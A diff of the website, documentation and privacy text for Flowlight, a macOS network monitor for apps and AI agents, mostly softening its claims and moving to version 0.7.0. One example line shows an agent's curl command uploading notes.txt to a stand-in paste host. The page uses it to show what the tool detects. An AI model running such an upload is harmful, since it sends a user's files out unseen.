@@ -22,7 +22,7 @@ About
  built to notice.
 
  The uploads were encrypted. The part that mattered wasn't: which app, which host, how many megabytes, and when. macOS
- already knows those facts for every connection. Flowlight exists to put them on screen, keep the history, and tell you when an app,
+ exposes those facts for supported network flows. Flowlight puts them on screen, keeps the history, and alerts when an app,
  especially an agent, does something that doesn't look like its usual self.
 
  Principles
@@ -31,11 +31,11 @@ About
  allowlist, a rule about an app or a destination, a guardrail on an agent's tools — but only once you turn that on, and never
  for local traffic, DNS or Apple services. Every refusal is recorded, and every refusal carries its way out.
 
- Metadata, not payloads. Hostnames, ports and byte counts are enough to catch what matters. Contents stay encrypted and unread.
+ Metadata by default. Standard monitoring records hostnames, ports and byte counts while payloads remain encrypted. Optional HTTPS inspection is explicit, scoped and locally stored.
 
  Local first. Your history is a file on your Mac. No account, no cloud, no telemetry.
 
- Explainable alerts. Every alert names the app, the destination and the number that tripped it. No black-box scores.
+ Explainable alerts. Alerts include the app, relevant destination and evidence that triggered the rule. Flowlight does not use an opaque risk model.
 
  Open source. A tool that watches your traffic should be one you can read. Flowlight is GPL-3.0.
 
@@ -62,7 +62,7 @@ Documentation
 
  Using Flowlight
 
- Everything from the first launch to tuning the agent rules. Flowlight 0.6.8, macOS 15 or later.
+ Everything from the first launch to tuning the agent rules. Flowlight 0.7.0, macOS 15 or later.
 
  On this page
 
@@ -323,7 +323,7 @@ open build/Build/Products/Release/Flowlight.app
  and start them there. Under Advanced you can decrypt AI agents only instead of every app, edit the never-decrypt list, copy
  the shell setup for one shell, or remove the certificate and everything recorded.
 
- Apple services and password managers are never decrypted (edit the list in Setup). Apps that pin their certificates refuse the
+ Flowlight excludes its built-in list of Apple services and password managers from decryption (edit the list in Setup). Apps that pin their certificates may reject the
  Flowlight certificate; Flowlight notices and passes them through encrypted. API keys, cookies and other credential headers are never
  stored, recorded requests are kept 3 days, and Remove Certificate & Recorded Data deletes the certificate, its trust
  setting and everything recorded. Inspection is HTTP/1.1 only (Flowlight asks both sides for it) and not available in demo mode.
@@ -680,11 +680,11 @@ URL: https://flowlight.xinbetween.com/
 
 Free · open source · macOS 15+
 
- Every app. Every domain. Every agent.
+ Know which apps connect. Understand where data goes.
 
- Flowlight shows which app on your Mac talked to which domain, over which protocol, and how much it sent.
- It keeps a closer eye on AI agents, so an email, an SSH session or a 180 MB upload you never asked for
- doesn't go unnoticed. Turn on HTTPS inspection and you see the tool calls behind it, too.
+ Flowlight records observed network activity by application, destination and protocol, with byte counts and historical analysis.
+ It highlights unusual AI agent activity, including sensitive protocols and large uploads. Optional HTTPS inspection can show
+ request details and model tool calls for applications explicitly routed through Flowlight.
 
  Download for macOS
 
@@ -692,7 +692,7 @@ Free · open source · macOS 15+
 
  brew install --cask xinbetween/tap/flowlightCopy
 
- v0.6.8macOS 15+UniversalGPL-3.0No telemetry
+ v0.7.0macOS 15+UniversalGPL-3.0No telemetry
 
  connectionslive
 
@@ -789,28 +789,26 @@ Optional. What did the agent actually send, and which tool call made it? Decrypt
 
  Capture
 
- The two questions Activity Monitor can't answer
+ Application-aware network visibility
 
- Which app sent it? Where did it go? Flowlight ties every TCP and UDP flow to its app and its real
- hostname, with bytes in and out, stored locally so you can look back an hour or a year.
+ Flowlight attributes observed TCP and UDP activity to applications and records destinations, protocols,
+ and byte counts locally. Coverage depends on the selected capture source and available hostname information.
 
- Every app
- Apps, command-line tools and background daemons, attributed by process. Your agents' helper scripts included.
+ Per application
+ Applications, command-line tools and background services attributed by process, including recognized agent child processes.
 
- Real hostnames
- Taken from TLS server names and DNS answers seen on the wire, so you see api.openai.com, not
- 104.18.7.192. Traffic with no name can show who owns the address.
+ Resolved hostnames
+ Learned from observed TLS server names and DNS responses. When no hostname is available, Flowlight can optionally identify the network owner.
 
  1 s → 1 year
  Zoom from second to year. Group by app, by destination or by IP. Hover a spike to see the app behind it.
 
  AI Agent Watch
 
- Your agents have network access. Now you have oversight.
+ Monitor how AI agents use the network
 
- Flowlight knows 16 agents by name. It also spots any other process that calls one of
- 27 LLM API providers, so a Python script talking to api.openai.com is an agent too.
- Browsers don't count: a person chatting isn't an agent.
+ Flowlight recognizes 16 agents by name and classifies other processes that contact one of
+ 27 known LLM API providers. Browser traffic is excluded from automatic agent classification.
 
  Claude CodeCodexCursor
  WindsurfGitHub CopilotGemini CLI
@@ -856,7 +854,7 @@ Optional. What did the agent actually send, and which tool call made it? Decrypt
  ⌕ Opt-in
  Tool calls, from the model's own responses
 
- Turn on HTTPS inspection and Flowlight reads every tool an agent offers the model, every call the model asks for and the result that came back, then ties each tool's request back to the call that caused it.
+ For supported providers and applications routed through HTTPS inspection, Flowlight can record declared tools, model-requested tool calls and returned results, then correlate a tool's network requests with the originating call.
 
  curl → paste.example:443  ←  Bash: curl -s https://paste.example/up -d @notes.txt
 
@@ -956,8 +954,8 @@ egress channel
 6
  APNsFCMDockerKubernetesOllama
 
- Flowlight observes every TCP and UDP flow, which covers essentially all app traffic. ICMP (ping) and
- other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted unless you turn on HTTPS inspection.
+ With the Network Extension enabled, Flowlight observes eligible TCP and UDP flows. ICMP, other raw-IP
+ protocols and some system traffic are outside this coverage. Encrypted payloads remain encrypted unless an application is explicitly routed through HTTPS inspection.
 
  How it compares
 
@@ -1001,10 +999,10 @@ e.g. Wireshark
 
  HTTPS inspection · optional
 
- See the tool call behind every request
+ Correlate supported tool calls with network requests
 
  Off by default. Turn it on and Flowlight becomes a local proxy with its own certificate authority, created on your
- Mac. Start an agent from an inspected Terminal and every request it and its tools make is decrypted, with the tool calls the
+ Mac. Start an agent from an inspected Terminal and supported HTTP traffic from the agent and its tools is decrypted, with tool calls the
  model asked for and the results that went back.
 
  Where did my notes go? curl's upload to paste.example, traced to the Bash command the model asked for, with the
@@ -1022,7 +1020,7 @@ e.g. Wireshark
 
  Readable bodiesJSON as a collapsible tree in its original order, streams one event at a time, headers and raw view.
 
- On your termsAI agents only by default. Apple services and password managers are never decrypted, credentials never stored, and one button removes it all.
+ Explicitly controlledInspection targets AI agents by default. Flowlight excludes its built-in list of Apple services and password managers, redacts credential headers before storage, and provides one action to remove the certificate and recorded data.
 
  Next
 
@@ -1056,7 +1054,7 @@ e.g. Wireshark
 
  Running in under a minute
 
- Download Flowlight.dmgOpen it and drag Flowlight into Applications. A .pkg installer is also on every release. Releases are signed and notarized, so macOS opens it without complaint.
+ Download Flowlight.dmgOpen it and drag Flowlight into Applications. A .pkg installer is also available with each release. Releases are signed with a Developer ID certificate and notarized by Apple.
 
  Launch itTraffic appears within a second, and live ↓↑ rates sit in your menu bar.
 
@@ -1088,7 +1086,7 @@ Questions
  that map names to addresses, and contents stay encrypted. If you want the full picture, HTTPS inspection is a
  separate, opt-in mode: Flowlight becomes a local proxy with its own certificate authority and decrypts the apps you route
  through it (AI agents only, by default), including every tool call a model asks an agent to run. Apps that pin their
- certificates still refuse it, and Apple services and password managers are never decrypted.
+ certificates may reject it. Flowlight excludes its built-in list of Apple services and password managers from inspection.
 
  How is this different from Little Snitch or LuLu?
 
@@ -1109,8 +1107,7 @@ Questions
 
  Does an allowlist block traffic?
 
- Not yet. A violation raises a critical alert and marks the destination "Not allowed". Blocking needs the Network
- Extension engine and is on the roadmap.
+ An allowlist reports violations by default. When the Network Extension is active, you can enable enforcement for an agent so unlisted destinations are refused. The nettop sampler can report violations but cannot block connections.
 
  Which agents does it recognize?
 
@@ -1142,10 +1139,10 @@ URL: https://flowlight.xinbetween.com/privacy/
 
 Privacy
 
- Your traffic stays on your Mac
+ Local by default, with documented exceptions
 
- Flowlight has no account, no server and no analytics. This page lists everything it records and every request it makes,
- so you can check the claims against the source.
+ Flowlight requires no account and includes no product analytics. Traffic records are stored locally. This page documents
+ what the app records, the optional features that contact external services, and how to verify these claims in the source code.
 
  On this page
  In shortWhat it recordsPacket captureRead locallyHTTPS inspection
@@ -1158,9 +1155,9 @@ Privacy
 
  It never records packet contents and never decrypts traffic, unless you turn on the optional HTTPS inspection for apps you route through it.
 
- Nothing you record is ever sent anywhere. There is no telemetry, crash reporting or analytics.
+ Flowlight does not upload its traffic database and includes no telemetry, crash reporting or product analytics.
 
- The app makes a few network requests of its own, listed below, and you can turn off each optional one.
+ The app's own external requests and user-configured export paths are documented below.
 
  What it records
 
@@ -1186,8 +1183,7 @@ Privacy
  Off by default. If you turn it on, Flowlight creates a certificate authority on your Mac (its key never leaves
  ~/Library/Application Support/Flowlight/Inspection) and runs a proxy that accepts connections only from this Mac. For apps you
  route through it, it records requests and responses, including bodies up to 2 MB, in the local database for 3 days. Credential headers
- (Authorization, cookies, API keys) are replaced with their length before anything is stored. Apple services and password managers are
- never decrypted. Nothing recorded is sent anywhere. Turning inspection off stops the proxy; Remove Certificate & Recorded
+ (Authorization, cookies, API keys) are replaced with their length before anything is stored. Flowlight excludes its built-in list of Apple services and password managers from decryption. Recorded inspection data is not uploaded by Flowlight. Turning inspection off stops the proxy; Remove Certificate & Recorded
  Data deletes the certificate, its trust setting and every recorded request.
 
  Network requests the app makes
@@ -1201,6 +1197,12 @@ Privacy
  Reverse DNSYour configured DNS resolverA lookup of an IP address's registered name, when no hostname was seenAs needed, in the default capture mode
 
  Network owner lookupTeam Cymru, over DNSPublic IP addresses with no known hostname. Private and reserved addresses never leave your MacOn by default. Off switch in Capture › Identify network owners
+
+ Ask with a hosted modelThe provider you select: Anthropic, OpenAI, Google Gemini or a compatible endpointYour question and the results returned by the read-only Flowlight queries selected by the model. The traffic database itself is not uploadedOnly when you select a hosted provider and submit a question. The Ask screen shows the transmitted requests
+
+ Collector exportThe OpenTelemetry or HTTP endpoint you configureThe fields shown in Settings › Export, such as traffic rollups and alerts. Authentication headers are stored in KeychainOnly after you configure an endpoint and enable export
+
+ Inspected application trafficThe original destination requested by the inspected applicationThe application's request, forwarded through Flowlight's local proxy after decryptionOnly while HTTPS inspection is enabled and the application is routed through the proxy
 
  Permissions
 
@@ -1236,8 +1238,26 @@ Releases
 
  Downloads, checksums and full notes for each version are on GitHub Releases.
 
- 0.6.8
+ 0.7.0
 September 25, 2026Latest
+
+ A new icon. A prism: one stream in, separated into what it is actually made of, with the
+ point of observation marked. The waveform and its two arrows said “bandwidth meter” and competed with each
+ other at Dock and menu sizes; the sizes below 64px are now drawn separately rather than shrunk.
+
+ Plainer language throughout the app, the README and the site — what Flowlight observes and
+ records, stated without overclaiming.
+
+ Ask keeps its suggestions. They wrap onto as many rows as they need instead of scrolling
+ out of sight, stay put after the first question, and the field is three lines tall.
+ About Ask →
+
+ The documentation contents reads as groups rather than as one run of twenty-nine links.
+
+ Downloads and checksums →
+
+ 0.6.8
+September 25, 2026
 
  Rules that name a host now fire. A connection was judged on its first bytes, which is
  before TLS hands over the name it is going to — a large ClientHello carries it in the second segment, and
